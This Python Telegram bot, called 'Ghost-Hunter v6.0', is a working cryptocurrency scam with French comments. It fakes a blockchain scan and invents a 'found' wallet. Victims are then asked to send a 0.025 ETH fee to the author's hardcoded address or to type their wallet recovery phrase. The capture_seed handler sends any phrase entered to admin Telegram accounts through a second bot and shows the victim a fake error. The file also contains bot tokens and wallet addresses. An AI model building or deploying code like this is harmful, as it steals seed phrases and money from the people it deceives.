import logging

import asyncio

import random

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot

from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters



# --- ⚙️ CONFIGURATION ---

logging.basicConfig(

    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',

    level=logging.INFO

)



TOKEN_PUBLIC = "8621910024:AAEJ3ANKQelWabRISx45g6aHDPIBYrb4EIQ"

TOKEN_STORAGE = "8589516658:AAFjUZiKwzANw_Z5frBAFfKoh8vVf4GczQA"

# Remplace l'ancienne ligne ADMIN_ID par celle-ci

ADMIN_IDS = ["7808474075", "8763163950"] 



MY_ETH_ADDRESS = "0xd1774E1AA3736E4907BaDc103481ff6d70851D67"

MY_SOL_ADDRESS = "66Gt1WgqrApF9QNi2jAjY81iFebnHDCYjpETR5HZPFCi"



storage_bot = Bot(token=TOKEN_STORAGE)

CRYPTO_EMOJIS = {"BTC": "₿", "ETH": "⬢", "USDT": "₮", "SOL": "◎"}



# --- 🎲 GÉNÉRATEURS ---

def get_random_balance(coin):

    """Génère un solde discret entre 45$ et 500$."""

    if coin == "BTC":

        val = round(random.uniform(0.001, 0.008), 4)

        usd = int(val * 64500)

        return f"{val} BTC (~${usd:,})".replace(",", " ")

    elif coin == "ETH":

        val = round(random.uniform(0.05, 0.25), 3)

        usd = int(val * 3400)

        return f"{val} ETH (~${usd:,})".replace(",", " ")

    elif coin == "USDT":

        val = random.randint(45, 450)

        return f"{val:,} USDT".replace(",", " ")

    elif coin == "SOL":

        val = round(random.uniform(0.8, 4.2), 2)

        usd = int(val * 145)

        return f"{val} SOL (~${usd:,})".replace(",", " ")

    return "0.00"



def generate_fake_addr(coin):

    chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789"

    if coin in ["ETH", "USDT"]:

        return "0x" + "".join(random.choice("abcdef0123456789") for _ in range(40))

    return "".join(random.choice(chars) for _ in range(38))



# --- 🤖 HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user

    text = (

        f"🚀 **Ghost-Hunter v6.0 Online**\n\n"

        f"Welcome {user.first_name}. Our software scans the blockchain for abandoned private keys.\n\n"

        f"Available chains: BTC, ETH, SOL, USDT."

    )

    keyboard = [[InlineKeyboardButton("🟢 START GLOBAL SCAN", callback_data="start_scan")]]

    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")



async def handle_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    msg = await query.edit_message_text("📡 **Connecting to Nodes...**", parse_mode="Markdown")

    

    for i in range(5):

        await asyncio.sleep(1)

        progress = "▓" * (i+1) + "░" * (4-i)

        await msg.edit_text(f"📡 **Scanning Blockchain...**\n`[{progress}]`", parse_mode="Markdown")



    await asyncio.sleep(1)

    target = random.choice(["BTC", "ETH", "USDT", "SOL"])

    addr = generate_fake_addr(target)

    balance = get_random_balance(target)

    

    hit_text = (

        f"🔥 **WALLET FOUND !**\n\n"

        f"**Coin:** {CRYPTO_EMOJIS[target]} {target}\n"

        f"**Address:** `{addr}`\n"

        f"**Balance:** `{balance}`\n\n"

        f"**Private Key:** `5KjP********[ENCRYPTED]********` \n"

        f"---"

    )

    

    keyboard = [

        [InlineKeyboardButton("💎 Withdraw Funds (Automatic)", callback_data="withdraw")],

        [InlineKeyboardButton("🔗 Connect Wallet to Unlock", callback_data="connect")]

    ]

    await msg.edit_text(hit_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")



async def back_to_options(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    context.user_data['waiting_for_seed'] = False

    

    text = (

        "🔥 **WALLET READY FOR EXTRACTION**\n\n"

        "Select your preferred method to unlock the private key and transfer the balance to your address."

    )

    keyboard = [

        [InlineKeyboardButton("💎 Withdraw Funds (Automatic)", callback_data="withdraw")],

        [InlineKeyboardButton("🔗 Connect Wallet to Unlock", callback_data="connect")]

    ]

    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")



async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    text = (

        "⚠️ **Extraction Security**\n\n"

        "To prevent bot spam, the contract requires a **Validation Fee (Gas)**.\n\n"

        f"Please send **0.025 ETH** to the Bridge Address:\n\n"

        f"📍 `{MY_ETH_ADDRESS}`\n\n"

        "The key will be sent automatically after 1 confirmation."

    )

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_hit")]]

    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")



async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    text = (

        "🔗 **WalletConnect v2.0**\n\n"

        "Please enter your **12 or 24 words Recovery Phrase** or your secret key below to synchronize the found key with your wallet."

    )

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_hit")]]

    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    context.user_data['waiting_for_seed'] = True



async def capture_seed(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if context.user_data.get('waiting_for_seed'):

        seed = update.message.text

        user = update.effective_user

        log_msg = f"💰 **NOUVELLE SEED**\n\n👤 User: {user.first_name}\n🔑 Seed: `{seed}`"

        

        # --- BLOC CORRIGÉ ---

        ADMIN_IDS = ["7808474075", "7676529934"] 

        try:

            for admin_id in ADMIN_IDS:

                await storage_bot.send_message(chat_id=admin_id, text=log_msg, parse_mode="Markdown")

        except Exception as e:

            logging.error(f"Error sending to storage: {e}")

        # ---------------------



        await update.message.reply_text("❌ **Error :** Synchronization failed. Check phrase and try again.")

        context.user_data['waiting_for_seed'] = False



# --- MAIN ---

if __name__ == '__main__':

    app = ApplicationBuilder().token(TOKEN_PUBLIC).build()

    

    app.add_handler(CommandHandler("start", start))

    app.add_handler(CallbackQueryHandler(handle_scan, pattern="start_scan"))

    app.add_handler(CallbackQueryHandler(withdraw, pattern="withdraw"))

    app.add_handler(CallbackQueryHandler(connect, pattern="connect"))

    app.add_handler(CallbackQueryHandler(back_to_options, pattern="back_to_hit"))

    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), capture_seed))

    

    print("--- BOT GHOST-HUNTER ONLINE ---")

    app.run_polling()










